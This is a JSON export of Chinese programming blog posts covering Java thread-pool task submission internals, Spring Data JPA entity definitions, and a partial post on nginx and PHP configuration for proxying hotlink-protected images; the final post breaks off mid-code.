}</code></pre>\n\n<p>至此，任务提交过程简单描述完毕，并介绍了任务提交后ExecutorService框架下线程池的主要应对逻辑，其实就是接收任务，根据需要创建或者维护管理线程。</p>\n\n<p>维护这些工作线程干什么用？先不用看后面的代码，想想我们老大每月辛苦地把老板丰厚的薪水递到我们手里，定期还要领着大家出去happy下，又是定期的关心下个人生活，所有做的这些都是为什么呢？木讷的代码工不往这边使劲动脑子，但是猜还是能猜的到的，就让干活呗。本文想着重表达细节，诸如线程池里的Worker是怎么工作的，Task到底是不是在这些工作线程中执行的，如何保证执行完成后，外面等待任务的老大拿到想要结果，我们将在<a href=\"http://www.infoq.com/cn/articles/executor-framework-thread-pool-task-execution-part-02\">下篇文章</a>中详细介绍。</p>",
			"markdowncontent":"## 一、前言\n\n1.5后引入的Executor框架的最大优点是把任务的提交和执行解耦。要执行任务的人只需把Task描述清楚，然后提交即可。这个Task是怎么被执行的，被谁执行的，什么时候执行的，提交的人就不用关心了。具体点讲，提交一个Callable对象给`ExecutorService`（如最常用的线程池ThreadPoolExecutor），将得到一个Future对象，调用Future对象的get方法等待执行结果就好了。\n\n经过这样的封装，对于使用者来说，提交任务获取结果的过程大大简化，调用者直接从提交的地方就可以等待获取执行结果。而封装最大的效果是使得真正执行任务的线程们变得不为人知。有没有觉得这个场景似曾相识？我们工作中当老大的老大（且称作LD^2）把一个任务交给我们老大（LD）的时候，到底是LD自己干，还是转过身来拉来一帮苦逼的兄弟加班加点干，那LD^2是不管的。LD^2只用把人描述清楚提及给LD，然后喝着咖啡等着收LD的report即可。等LD一封邮件非常优雅地报告LD^2report结果时，实际操作中是码农A和码农B干了一个月，还是码农ABCDE加班干了一个礼拜，大多是不用体现的。这套机制的优点就是LD^2找个合适的LD出来提交任务即可，接口友好有效，不用为具体怎么干费神费力。\n\n## 二、 一个最简单的例子\n\n看上去这个执行过程是这个样子。调用这段代码的是老大的老大了，他所需要干的所有事情就是找到一个合适的老大（如下面例子中laodaA就荣幸地被选中了），提交任务就好了。\n```java \n    // 一个有7个作业线程的线程池，老大的老大找到一个管7个人的小团队的老大\n           ExecutorService laodaA = Executors.newFixedThreadPool(7);\n    \t\t //提交作业给老大，作业内容封装在Callable中，约定好了输出的类型是String。\n    \t\t\tString outputs = laoda.submit(\n    \t\t\t         new Callable<String>() {\n    \t\t\t             public String call() throws Exception \n    \t\t\t             {\t\t\t                \n    \t\t\t                 return \"I am a task, which submited by the so called laoda, and run by those anonymous workers\";\n    \t\t\t             }\n    \t\t\t             //提交后就等着结果吧，到底是手下7个作业中谁领到任务了，老大是不关心的。\n    \t\t\t         }).get();\n    \n    \t\t\tSystem.out.println(outputs);\n```\n使用上非常简单，其实只有两行语句来完成所有功能：创建一个线程池，提交任务并等待获取执行结果。\n\n例子中生成线程池采用了工具类Executors的静态方法。除了newFixedThreadPool可以生成固定大小的线程池，newCachedThreadPool可以生成一个无界、可以自动回收的线程池，newSingleThreadScheduledExecutor可以生成一个单个线程的线程池。newScheduledThreadPool还可以生成支持周期任务的线程池。一般用户场景下各种不同设置要求的线程池都可以这样生成，不用自己new一个线程池出来。\n\n## 三、代码剖析\n这套机制怎么用，上面两句语句就做到了，非常方便和友好。但是submit的task是怎么被执行的？是谁执行的？如何做到在调用的时候只有等待执行结束才能get到结果。这些都是1.5之后Executor接口下的线程池、Future接口下的可获得执行结果的的任务，配合AQS和原有的Runnable来做到的。在下文中我们尝试通过剖析每部分的代码来了解Task提交，Task执行，获取Task执行结果等几个主要步骤。为了控制篇幅，突出主要逻辑，文章中引用的代码片段去掉了异常捕获、非主要条件判断、非主要操作。文中只是以最常用的ThreadPoolExecutor线程池举例，其实ExecutorService接口下定义了很多功能丰富的其他类型，有各自的特点，但风格类似。本文重点是介绍任务提交的过程，过程中涉及的ExecutorService、ThreadPoolExecutor、AQS、Future、FutureTask等只会介绍该过程中用到的内容，不会对每个类都详细展开。\n\n1、 任务提交\n\n从类图上可以看到，接口ExecutorService继承自Executor。不像Executor中只定义了一个方法来执行任务，在ExecutorService中，正如其名字暗示的一样，定义了一个服务，定义了完整的线程池的行为，可以接受提交任务、执行任务、关闭服务。抽象类AbstractExecutorService类实现了ExecutorService接口，也实现了接口定义的默认行为。\n\n[![](http://cdn.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-01/zh/resources/0601000.jpg)](http://cdn.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-01/zh/resources/0601000.jpg)\n\nAbstractExecutorService任务提交的submit方法有三个实现。第一个接收一个Runnable的Task，没有执行结果；第二个是两个参数：一个任务，一个执行结果；第三个一个Callable，本身就包含执任务内容和执行结果。 submit方法的返回结果是Future类型，调用该接口定义的get方法即可获得执行结果。** V get() 方法的返回值类型V是在提交任务时就约定好了的。**\n\n除了submit任务的方法外，作为对服务的管理，在ExecutorService接口中还定义了服务的关闭方法shutdown和shutdownNow方法，可以平缓或者立即关闭执行服务，实现该方法的子类根据自身特征支持该定义。在ThreadPoolExecutor中，维护了RUNNING、SHUTDOWN、STOP、TERMINATED四种状态来实现对线程池的管理。线程池的完整运行机制不是本文的重点，重点还是关注submit过程中的逻辑。\n\n1) 看AbstractExecutorService中代码提交部分，构造好一个FutureTask对象后，调用execute()方法执行任务。我们知道这个方法是顶级接口Executor中定义的最重要的方法。。FutureTask类型实现了Runnable接口，因此满足Executor中execute()方法的约定。同时比较有意思的是，该对象在execute执行后，就又作为submit方法的返回值返回，因为FutureTask同时又实现了Future接口，满足Future接口的约定。\n```java\n      public <T> Future<T> submit(Callable<T> task) {\n            if (task == null) throw new NullPointerException();\n            RunnableFuture<T> ftask = newTaskFor(task);\n            execute(ftask);\n            return ftask;\n        }\n```\n2) Submit传入的参数都被封装成了FutureTask类型来execute的，对应前面三个不同的参数类型都会封装成FutureTask。\n```java \n       protected <T> RunnableFuture<T> newTaskFor(Callable<T> callable) {\n            return new FutureTask<T>(callable);\n        }\n```\n3) Executor接口中定义的execute方法的作用就是执行提交的任务，该方法在抽象类AbstractExecutorService中没有实现，留到子类中实现。我们观察下子类ThreadPoolExecutor，使用最广泛的线程池如何来execute那些submit的任务的。这个方法看着比较简单，但是线程池什么时候创建新的作业线程来处理任务，什么时候只接收任务不创建作业线程，另外什么时候拒绝任务。线程池的接收任务、维护工作线程的策略都要在其中体现。\n\n作为必要的预备知识，先补充下ThreadPoolExecutor有两个最重要的集合属性，分别是存储接收任务的任务队列和用来干活的作业集合。\n```java \n    //任务队列\n    private final BlockingQueue<Runnable> workQueue;\n    //作业线程集合\n    private final HashSet<Worker> workers = new HashSet<Worker>();\n```\n其中阻塞队列workQueue是来存储待执行的任务的，在构造线程池时可以选择满足该BlockingQueue 接口定义的SynchronousQueue、LinkedBlockingQueue或者DelayedWorkQueue等不同阻塞队列来实现不同特征的线程池。\n\n关注下execute(Runnable command)方法中调用到的addIfUnderCorePoolSize，workQueue.offer(command) ， ensureQueuedTaskHandled(command)，addIfUnderMaximumPoolSize(command)这几个操作。尤其几个名字较长的private方法，把方法名的驼峰式的单词分开，加上对方法上下文的了解就能理解其功能。\n\n因为前面说到的几个方法在里面即是操作，又返回一个布尔值，影响后面的逻辑，所以不大方便在方法体中为每条语句加注释来说明，需要大致关联起来看。所以首先需要把execute方法的主要逻辑说明下，再看其中各自方法的作用。\n\n- 如果线程池的状态是RUNNING，线程池的大小小于配置的核心线程数，说明还可以创建新线程，则启动新的线程执行这个任务。\n- 如果线程池的状态是RUNNING ，线程池的大小小于配置的最大线程数，并且任务队列已经满了，说明现有线程已经不能支持当前的任务了，并且线程池还有继续扩充的空间，就可以创建一个新的线程来处理提交的任务。\n- 如果线程池的状态是RUNNING，当前线程池的大小大于等于配置的核心线程数，说明根据配置当前的线程数已经够用，不用创建新线程，只需把任务加入任务队列即可。如果任务队列不满，则提交的任务在任务队列中等待处理；如果任务队列满了则需要考虑是否要扩展线程池的容量。\n- 当线程池已经关闭或者上面的条件都不能满足时，则进行拒绝策略，拒绝策略在RejectedExecutionHandler接口中定义，可以有多种不同的实现。\n\n上面其实也是对最主要思路的解析，详细展开可能还会更复杂。简单梳理下思路：构建线程池时定义了一个额定大小，当线程池内工作线程数小于额定大小，有新任务进来就创建新工作线程，如果超过该阈值，则一般就不创建了，只是把接收任务加到任务队列里面。但是如果任务队列里的任务实在太多了，那还是要申请额外的工作线程来帮忙。如果还是不够用就拒绝服务。这个场景其实也是每天我们工作中会碰到的场景。我们管人的老大，手里都有一定HC（Head Count），当上面老大有活分下来，手里人不够，但是不超过HC，我们就自己招人；如果超过了还是忙不过来，那就向上门老大申请借调人手来帮忙；如果还是干不完，那就没办法了，新任务咱就不接了。\n```java \n    public void execute(Runnable command) {\n            if (command == null)\n                throw new NullPointerException();\n            if (poolSize >= corePoolSize || !addIfUnderCorePoolSize(command)) {\n                if (runState == RUNNING && workQueue.offer(command)) {\n                    if (runState != RUNNING || poolSize == 0)\n                        ensureQueuedTaskHandled(command);\n                }\n                else if (!addIfUnderMaximumPoolSize(command))\n                    reject(command); // is shutdown or saturated\n            }\n    }\n```\n4) addIfUnderCorePoolSize方法检查如果当前线程池的大小小于配置的核心线程数，说明还可以创建新线程，则启动新的线程执行这个任务。\n```java \n       private boolean addIfUnderCorePoolSize(Runnable firstTask) {\n            Thread t = null;\n           //如果当前线程池的大小小于配置的核心线程数，说明还可以创建新线程\n                if (poolSize < corePoolSize && runState == RUNNING)\n          // 则启动新的线程执行这个任务\n                    t = addThread(firstTask);        \n            return t != null;\n        }\n```\n5)  和上一个方法类似，addIfUnderMaximumPoolSize检查如果线程池的大小小于配置的最大线程数，并且任务队列已经满了（就是execute方法试图把当前线程加入任务队列时不成功），说明现有线程已经不能支持当前的任务了，但线程池还有继续扩充的空间，就可以创建一个新的线程来处理提交的任务。\n```java \n        private boolean addIfUnderMaximumPoolSize(Runnable firstTask) {\n               // 如果线程池的大小小于配置的最大线程数，并且任务队列已经满了（就\n    是execute方法中试图把当前线程加入任务队列workQueue.offer(command)时候不成功\n    ）,说明现有线程已经不能支持当前的任务了，但线程池还有继续扩充的空间       \n                if (poolSize < maximumPoolSize && runState == RUNNING)\n              //就可以创建一个新的线程来处理提交的任务\n                t = addThread(firstTask);           \n            return t != null;\n        }\n```\n6)  在ensureQueuedTaskHandled方法中，判断如果当前状态不是RUNING，则当前任务不加入到任务队列中，判断如果状态是停止，线程数小于允许的最大数，且任务队列还不空，则加入一个新的工作线程到线程池来帮助处理还未处理完的任务。\n```java \n    private void ensureQueuedTaskHandled(Runnable command) {\n                //  如果当前状态不是RUNING，则当前任务不加入到任务队列中，判断如\n    果状态是停止，线程数小于允许的最大数，且任务队列还不空\n                 if (state < STOP &&\n                         poolSize < Math.max(corePoolSize, 1) &&\n                         !workQueue.isEmpty())\n                //则加入一个新的工作线程到线程池来帮助处理还未处理完的任务\n                    t = addThread(null);\n            if (reject)\n                reject(command);\n        }\n```\n7)   在前面方法中都会调用adThread方法创建一个工作线程，差别是创建的有些工作线程上面关联接收到的任务firstTask，有些没有。该方法为当前接收到的任务firstTask创建Worker，并将Worker添加到作业集合HashSet<Worker> workers中，并启动作业。\n```java \n    private Thread addThread(Runnable firstTask) {\n            //为当前接收到的任务firstTask创建Worker\n            Worker w = new Worker(firstTask);\n            Thread t = threadFactory.newThread(w);\n                w.thread = t;\n           //将Worker添加到作业集合HashSet<Worker> workers中，并启动作业\n                workers.add(w);\n                    t.start();\n            return t;\n        }\n```\n至此，任务提交过程简单描述完毕，并介绍了任务提交后ExecutorService框架下线程池的主要应对逻辑，其实就是接收任务，根据需要创建或者维护管理线程。\n\n维护这些工作线程干什么用？先不用看后面的代码，想想我们老大每月辛苦地把老板丰厚的薪水递到我们手里，定期还要领着大家出去happy下，又是定期的关心下个人生活，所有做的这些都是为什么呢？木讷的代码工不往这边使劲动脑子，但是猜还是能猜的到的，就让干活呗。本文想着重表达细节，诸如线程池里的Worker是怎么工作的，Task到底是不是在这些工作线程中执行的，如何保证执行完成后，外面等待任务的老大拿到想要结果，我们将在[下篇文章](http://www.infoq.com/cn/articles/executor-framework-thread-pool-task-execution-part-02)中详细介绍。\n",
			"tags":"线程池,java",
			"id":"55101017",
			"categories":"JAVA基础",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年02月06日 22:37:26",
			"articleedittype":1,
			"private":0,
			"channel":"0",
			"description":"自有项目使用spring boot 构建，数据库默认使用mysql，使用spring data jpa来访问数据库，在使用中遇到了很多问题，也学习了很多使用经验，避免以后踩更多的坑。总结如下：\n\n\n以下一切代码皆为实战总结，可能会有不足，但是现目前自己使用的场景基本涵盖 \n使用实体如下: \nProductEntity:\n\n\n/**\n * @author yoqu\n * @email yoqulin",
			"title":"spring data jpa复杂分页排序查询的使用讲解",
			"type":"original",
			"content":"<blockquote>\n  <p>自有项目使用spring boot 构建，数据库默认使用mysql，使用spring data jpa来访问数据库，在使用中遇到了很多问题，也学习了很多使用经验，避免以后踩更多的坑。总结如下：</p>\n</blockquote>\n\n<p><strong>以下一切代码皆为实战总结，可能会有不足，但是现目前自己使用的场景基本涵盖</strong> <br>\n使用实体如下: <br>\n<code>ProductEntity</code>:</p>\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">\n<span class=\"hljs-javadoc\">/**\n *<span class=\"hljs-javadoctag\"> @author</span> yoqu\n *<span class=\"hljs-javadoctag\"> @email</span> yoqulin@qq.com\n *<span class=\"hljs-javadoctag\"> @date</span> 2017/1/8 0008\n *<span class=\"hljs-javadoctag\"> @time</span> 15:43\n */</span>\n<span class=\"hljs-annotation\">@Entity</span>\n<span class=\"hljs-annotation\">@Table</span>(name = <span class=\"hljs-string\">\"product\"</span>, catalog = <span class=\"hljs-string\">\"\"</span>)\n<span class=\"hljs-annotation\">@JsonIgnoreProperties</span>(ignoreUnknown = <span class=\"hljs-keyword\">true</span>)\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">ProductEntity</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title\">BaseEntity</span> {</span>\n    <span class=\"hljs-keyword\">private</span> String name;\n    <span class=\"hljs-keyword\">private</span> String picture;\n    <span class=\"hljs-keyword\">private</span> String description;\n\n    <span class=\"hljs-annotation\">@Lob</span>\n    <span class=\"hljs-annotation\">@Column</span>(name = <span class=\"hljs-string\">\"detail_description\"</span>)\n    <span class=\"hljs-keyword\">private</span> String detailDescription;\n\n    <span class=\"hljs-keyword\">private</span> String pdf;\n\n    <span class=\"hljs-keyword\">private</span> String pdfName;\n\n    <span class=\"hljs-keyword\">private</span> String pictureName;\n    <span class=\"hljs-keyword\">private</span> Float price;\n    <span class=\"hljs-keyword\">private</span> Integer status;\n    <span class=\"hljs-annotation\">@JoinColumn</span>(name = <span class=\"hljs-string\">\"product_type_id\"</span>)\n    <span class=\"hljs-annotation\">@ManyToOne</span>(cascade = CascadeType.MERGE)\n    <span class=\"hljs-keyword\">private</span> ProductTypeEntity productTypeEntity;\n\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">getPdfName</span>() {\n        <span class=\"hljs-keyword\">return</span> pdfName;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setPdfName</span>(String pdfName) {\n        <span class=\"hljs-keyword\">this</span>.pdfName = pdfName;\n    }\n\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">getPictureName</span>() {\n        <span class=\"hljs-keyword\">return</span> pictureName;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setPictureName</span>(String pictureName) {\n        <span class=\"hljs-keyword\">this</span>.pictureName = pictureName;\n    }\n\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">getDetailDescription</span>() {\n        <span class=\"hljs-keyword\">return</span> detailDescription;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setDetailDescription</span>(String detailDescription) {\n        <span class=\"hljs-keyword\">this</span>.detailDescription = detailDescription;\n    }\n\n    <span class=\"hljs-keyword\">public</span> ProductTypeEntity <span class=\"hljs-title\">getProductTypeEntity</span>() {\n        <span class=\"hljs-keyword\">return</span> productTypeEntity;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setProductTypeEntity</span>(ProductTypeEntity productTypeEntity) {\n        <span class=\"hljs-keyword\">this</span>.productTypeEntity = productTypeEntity;\n    }\n\n    <span class=\"hljs-annotation\">@Basic</span>\n    <span class=\"hljs-annotation\">@Column</span>(name = <span class=\"hljs-string\">\"name\"</span>)\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">getName</span>() {\n        <span class=\"hljs-keyword\">return</span> name;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setName</span>(String name) {\n        <span class=\"hljs-keyword\">this</span>.name = name;\n    }\n\n    <span class=\"hljs-annotation\">@Basic</span>\n    <span class=\"hljs-annotation\">@Column</span>(name = <span class=\"hljs-string\">\"picture\"</span>)\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">getPicture</span>() {\n        <span class=\"hljs-keyword\">return</span> picture;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setPicture</span>(String picture) {\n        <span class=\"hljs-keyword\">this</span>.picture = picture;\n    }\n\n    <span class=\"hljs-annotation\">@Basic</span>\n    <span class=\"hljs-annotation\">@Column</span>(name = <span class=\"hljs-string\">\"description\"</span>)\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">getDescription</span>() {\n        <span class=\"hljs-keyword\">return</span> description;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setDescription</span>(String description) {\n        <span class=\"hljs-keyword\">this</span>.description = description;\n    }\n\n    <span class=\"hljs-annotation\">@Basic</span>\n    <span class=\"hljs-annotation\">@Column</span>(name = <span class=\"hljs-string\">\"pdf\"</span>)\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">getPdf</span>() {\n        <span class=\"hljs-keyword\">return</span> pdf;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setPdf</span>(String pdf) {\n        <span class=\"hljs-keyword\">this</span>.pdf = pdf;\n    }\n\n    <span class=\"hljs-annotation\">@Basic</span>\n    <span class=\"hljs-annotation\">@Column</span>(name = <span class=\"hljs-string\">\"price\"</span>)\n    <span class=\"hljs-keyword\">public</span> Float <span class=\"hljs-title\">getPrice</span>() {\n        <span class=\"hljs-keyword\">return</span> price;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setPrice</span>(Float price) {\n        <span class=\"hljs-keyword\">this</span>.price = price;\n    }\n\n    <span class=\"hljs-annotation\">@Basic</span>\n    <span class=\"hljs-annotation\">@Column</span>(name = <span class=\"hljs-string\">\"status\"</span>)\n    <span class=\"hljs-keyword\">public</span> Integer <span class=\"hljs-title\">getStatus</span>() {\n        <span class=\"hljs-keyword\">return</span> status;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setStatus</span>(Integer status) {\n        <span class=\"hljs-keyword\">this</span>.status = status;\n    }\n\n\n}\n</code></pre>\n\n<p><code>ProdcutTypeEntity</code></p>\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-javadoc\">/**\n *<span class=\"hljs-javadoctag\"> @author</span> yoqu\n *<span class=\"hljs-javadoctag\"> @email</span> yoqulin@qq.com\n *<span class=\"hljs-javadoctag\"> @date</span> 2017/1/8 0008\n *<span class=\"hljs-javadoctag\"> @time</span> 16:18\n */</span>\n<span class=\"hljs-annotation\">@Entity</span>\n<span class=\"hljs-annotation\">@Table</span>(name = <span class=\"hljs-string\">\"product_type\"</span>)\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">ProductTypeEntity</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title\">BaseEntity</span> {</span>\n    <span class=\"hljs-keyword\">private</span> String name;\n\n    <span class=\"hljs-annotation\">@OneToMany</span>(mappedBy = <span class=\"hljs-string\">\"productTypeEntity\"</span>,cascade = CascadeType.MERGE)\n<span class=\"hljs-comment\">//    @JoinColumn(name = \"product_type_id\")</span>\n    <span class=\"hljs-keyword\">private</span> List&lt;ProductEntity&gt; ProductEntityList;\n\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">getName</span>() {\n        <span class=\"hljs-keyword\">return</span> name;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setName</span>(String name) {\n        <span class=\"hljs-keyword\">this</span>.name = name;\n    }\n\n    <span class=\"hljs-keyword\">public</span> List&lt;ProductEntity&gt; <span class=\"hljs-title\">getProductEntityList</span>() {\n        <span class=\"hljs-keyword\">return</span> ProductEntityList;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setProductEntityList</span>(List&lt;ProductEntity&gt; productEntityList) {\n        ProductEntityList = productEntityList;\n    }\n}</code></pre>\n\n<h3 id=\"普通查询\">普通查询</h3>\n\n\n\n<h4 id=\"在repository基础上做查询\">在repository基础上做查询</h4>\n\n<p>自定义一个repository接口</p>\n\n<h4 id=\"使用符合spring-data-jpa规范命名方法名的查询\">使用符合spring data jpa规范命名方法名的查询</h4>\n\n<h3 id=\"复杂查询\">复杂查询</h3>\n\n\n\n<h4 id=\"复杂查询工具推荐\">复杂查询工具推荐</h4>\n\n\n\n<h4 id=\"单表复杂查询\">单表复杂查询</h4>\n\n\n\n<h4 id=\"多表复杂查询\">多表复杂查询</h4>\n\n<h3 id=\"分页查询\">分页查询</h3>\n\n\n\n<h3 id=\"排序查询\">排序查询</h3>\n\n\n\n<h2 id=\"综合\">综合</h2>",
			"markdowncontent":"> 自有项目使用spring boot 构建，数据库默认使用mysql，使用spring data jpa来访问数据库，在使用中遇到了很多问题，也学习了很多使用经验，避免以后踩更多的坑。总结如下：\n\n**以下一切代码皆为实战总结，可能会有不足，但是现目前自己使用的场景基本涵盖**\n使用实体如下:\n`ProductEntity`:\n```java\n\n/**\n * @author yoqu\n * @email yoqulin@qq.com\n * @date 2017/1/8 0008\n * @time 15:43\n */\n@Entity\n@Table(name = \"product\", catalog = \"\")\n@JsonIgnoreProperties(ignoreUnknown = true)\npublic class ProductEntity extends BaseEntity {\n    private String name;\n    private String picture;\n    private String description;\n\n    @Lob\n    @Column(name = \"detail_description\")\n    private String detailDescription;\n\n    private String pdf;\n\n    private String pdfName;\n\n    private String pictureName;\n    private Float price;\n    private Integer status;\n    @JoinColumn(name = \"product_type_id\")\n    @ManyToOne(cascade = CascadeType.MERGE)\n    private ProductTypeEntity productTypeEntity;\n\n    public String getPdfName() {\n        return pdfName;\n    }\n\n    public void setPdfName(String pdfName) {\n        this.pdfName = pdfName;\n    }\n\n    public String getPictureName() {\n        return pictureName;\n    }\n\n    public void setPictureName(String pictureName) {\n        this.pictureName = pictureName;\n    }\n\n    public String getDetailDescription() {\n        return detailDescription;\n    }\n\n    public void setDetailDescription(String detailDescription) {\n        this.detailDescription = detailDescription;\n    }\n\n    public ProductTypeEntity getProductTypeEntity() {\n        return productTypeEntity;\n    }\n\n    public void setProductTypeEntity(ProductTypeEntity productTypeEntity) {\n        this.productTypeEntity = productTypeEntity;\n    }\n\n    @Basic\n    @Column(name = \"name\")\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    @Basic\n    @Column(name = \"picture\")\n    public String getPicture() {\n        return picture;\n    }\n\n    public void setPicture(String picture) {\n        this.picture = picture;\n    }\n\n    @Basic\n    @Column(name = \"description\")\n    public String getDescription() {\n        return description;\n    }\n\n    public void setDescription(String description) {\n        this.description = description;\n    }\n\n    @Basic\n    @Column(name = \"pdf\")\n    public String getPdf() {\n        return pdf;\n    }\n\n    public void setPdf(String pdf) {\n        this.pdf = pdf;\n    }\n\n    @Basic\n    @Column(name = \"price\")\n    public Float getPrice() {\n        return price;\n    }\n\n    public void setPrice(Float price) {\n        this.price = price;\n    }\n\n    @Basic\n    @Column(name = \"status\")\n    public Integer getStatus() {\n        return status;\n    }\n\n    public void setStatus(Integer status) {\n        this.status = status;\n    }\n\n\n}\n\n```\n`ProdcutTypeEntity`\n\n```java \n/**\n * @author yoqu\n * @email yoqulin@qq.com\n * @date 2017/1/8 0008\n * @time 16:18\n */\n@Entity\n@Table(name = \"product_type\")\npublic class ProductTypeEntity extends BaseEntity {\n    private String name;\n\n    @OneToMany(mappedBy = \"productTypeEntity\",cascade = CascadeType.MERGE)\n//    @JoinColumn(name = \"product_type_id\")\n    private List<ProductEntity> ProductEntityList;\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public List<ProductEntity> getProductEntityList() {\n        return ProductEntityList;\n    }\n\n    public void setProductEntityList(List<ProductEntity> productEntityList) {\n        ProductEntityList = productEntityList;\n    }\n}\n```\n### 普通查询\n\n#### 在repository基础上做查询\n自定义一个repository接口\n#### 使用符合spring data jpa规范命名方法名的查询\n\n### 复杂查询\n\n#### 复杂查询工具推荐\n\n#### 单表复杂查询\n\n#### 多表复杂查询\n\n### 分页查询\n\n### 排序查询\n\n## 综合",
			"tags":"",
			"id":"54897876",
			"categories":"",
			"status":2
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年10月29日 17:38:21",
			"articleedittype":1,
			"private":0,
			"channel":"12",
			"description":"为什么要处理这些东西，在做网站采集的时候，有时候我们并不想吧网站的图片全部下载下来，而是希望可以引用它原本网站上的图片，这样可以我们既可以拿到资源，又可以节约我们的磁盘空间，不过坏处就是被抓取的网站如果挂了，图片无法访问，那同样我们的服务器去访问也就失败了！\nnginx 配置server里面的一个路径piclocation /pic/ {\n            set $hostx \"\";",
			"title":"破解防盗链的图片的一些方法总结",
			"type":"original",
			"content":"<blockquote>\n  <p>为什么要反向代理处理图片资源呢？因为在做网站采集的时候，有时候我们并不想吧网站的图片全部下载下来，而是希望可以引用它原本网站上的图片，这样可以我们既可以拿到资源，又可以节约我们的磁盘空间，不过坏处就是被抓取的网站如果挂了，图片无法访问，那同样我们的服务器去访问也就失败了！</p>\n</blockquote>\n\n\n\n<h3 id=\"1nginx-反向代理配置server里面的一个路径pic\">1.nginx 反向代理配置server里面的一个路径pic</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">location /pic<span class=\"hljs-subst\">/</span> {\n            <span class=\"hljs-built_in\">set</span> <span class=\"hljs-variable\">$hostx</span> <span class=\"hljs-string\">\"\"</span>; \n            <span class=\"hljs-built_in\">set</span> <span class=\"hljs-variable\">$addrs</span> <span class=\"hljs-string\">\"\"</span>; \n            <span class=\"hljs-keyword\">if</span> ( <span class=\"hljs-variable\">$uri</span> ~ <span class=\"hljs-string\">\"^/pic/http./+([^/]+)/(.+)$\"</span>) { \n             <span class=\"hljs-built_in\">set</span> <span class=\"hljs-variable\">$hostx</span> $<span class=\"hljs-number\">1</span>; \n             <span class=\"hljs-built_in\">set</span> <span class=\"hljs-variable\">$addrs</span> $<span class=\"hljs-number\">2</span>; \n            } \n            <span class=\"hljs-variable\">#resolver</span> <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>; \n            <span class=\"hljs-variable\">#proxy_pass</span> http:<span class=\"hljs-comment\">//$hostx/$addrs; </span>\n            <span class=\"hljs-variable\">#proxy_set_header</span> <span class=\"hljs-keyword\">referer</span> <span class=\"hljs-string\">\"http://$hostx\"</span>;\n            rewrite ^(<span class=\"hljs-built_in\">.</span><span class=\"hljs-subst\">*</span>)$  http:<span class=\"hljs-comment\">//$hostx/$addrs;</span>\n            <span class=\"hljs-variable\">#http</span>:<span class=\"hljs-comment\">//mmbiz.qpic.cn/$arg_url;</span>\n            <span class=\"hljs-variable\">#proxy_pass</span> http:<span class=\"hljs-comment\">//mmbiz.qpic.cn/$arg_search;</span>\n        }</code></pre>\n\n<p>本来是想用proxy来做的，试了下会发生一个死循环，还不知道为什么无法成功，网上资料也还没找到，要是有同学会的话，希望可以指教一二， 最后我只好用rewrite 来让它去跳转了. <br>\n对uri进行了一个处理，pic目录后面的应该跟上完整的图片的http路径，然后rewrite到hosts去。。</p>\n\n\n\n<h4 id=\"待解决\"><strong><em>待解决</em></strong> ：</h4>\n\n<blockquote>\n  <p>还是要用proxy_pass来处理，这样可以加referer，更完美</p>\n</blockquote>\n\n<hr>\n\n<p><strong><em>*10月31日更新*</em></strong></p>\n\n<blockquote>\n  <p>解决了proxy_pass处理失败的问题，原因是resolver没有指定dns地址，用本地地址报错，所以换成电脑上的dns地址就OK了。不过在处理微信公众号还是下载不下来，我还没弄清楚具体原因。</p>\n</blockquote>\n\n<h3 id=\"php下载文件解决\">php下载文件解决：</h3>\n\n<p>使用php来做一个下载生成，只需要两行代码即可完成：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\"><span class=\"php\"><span class=\"hljs-preprocessor\">&lt;?php</span>\n  header(<span class=\"hljs-string\">'Content-type: image/jpeg'</span>);\n  <span 